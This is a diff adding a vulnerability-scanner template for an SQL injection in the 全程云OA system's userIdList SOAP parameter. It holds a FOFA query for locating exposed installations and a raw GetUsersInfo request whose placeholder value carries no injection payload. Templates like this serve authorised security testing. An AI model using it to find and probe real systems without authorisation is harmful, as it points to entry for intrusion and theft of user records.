@@ -1,0 +1,34 @@
+id: quancheng-oa-useridlist-sqli
+
+info:
+  name: "全程云OA系统userIdList接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="images/yipeoplehover.png"
+  tags: 全程云OA
+
+http:
+- raw:
+  - |
+    POST /oa/pm/svc.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/GetUsersInfo"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <GetUsersInfo xmlns="http://tempuri.org/">
+          <userIdList>string</userIdList>
+        </GetUsersInfo>
+      </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'GetUsersInfoResponse'
